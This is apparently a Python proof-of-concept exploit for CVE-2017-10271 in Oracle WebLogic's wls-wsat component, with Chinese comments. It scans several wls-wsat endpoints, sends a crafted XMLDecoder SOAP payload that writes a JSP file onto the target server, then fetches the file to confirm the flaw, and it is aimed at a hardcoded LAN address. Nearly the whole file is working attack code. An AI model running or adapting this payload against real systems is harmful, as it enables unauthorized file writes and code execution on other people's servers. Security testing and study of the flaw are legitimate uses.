#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/11 22:50
# Author     : yunkong
# FileName   : cve_2017_10271_poc.py
# Description:
#
# Exploit Title: Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）
# Version: 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, 12.2.1.2.0
# CVE: CVE-2017-10271
import random
from time import sleep

import requests
import string


def get_random(lens: int):
    # 定义可选的字符集
    characters = string.ascii_lowercase + string.digits

    return ''.join(random.choice(characters) for i in range(lens))


def check_cve_2017_10271(target_url, path):
    random_str = get_random(6)
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Content-Type": "text/xml"
    }
    data = f'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work' \
           f':WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" ' \
           f'class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> ' \
           f'<string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string><void ' \
           f'method="println"><string><![CDATA[<% out.print("{random_str}"); %>]]></string></void><void ' \
           f'method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv' \
           f':Envelope> '
    requests.request(method="POST",
                     url=target_url + path,
                     headers=headers,
                     data=data,
                     timeout=3)
    sleep(1)
    response = requests.request(method="GET",
                                url=f"{target_url}/bea_wls_internal/test.jsp")
    if random_str == response.text.strip():
        return path


def check_path(target_url):
    wls_wsat_list = ["/wls-wsat/CoordinatorPortType",
                     "/wls-wsat/RegistrationPortTypeRPC",
                     "/wls-wsat/ParticipantPortType",
                     "/wls-wsat/RegistrationRequesterPortType ",
                     "/wls-wsat/CoordinatorPortType11",
                     "/wls-wsat/RegistrationPortTypeRPC11 ",
                     "/wls-wsat/ParticipantPortType11",
                     "/wls-wsat/RegistrationRequesterPortType11"]
    path_list = []
    for wls_wsat in wls_wsat_list:
        response = requests.get(url=target_url + wls_wsat)
        if response.status_code == 200:
            path_list.append(wls_wsat)
    return path_list


def vuln_scan_start(target_url):
    vuln_list = []
    for path in check_path(target_url):
        effe_path = check_cve_2017_10271(target_url, path)
        if effe_path:
            vuln_list.append(effe_path)
    if len(vuln_list) > 0:
        return "CVE-2017-10271 可能存在！！！"
    else:
        return "CVE-2017-10271 可能不存在！！！"


print(vuln_scan_start("http://192.168.12.130:7001"))
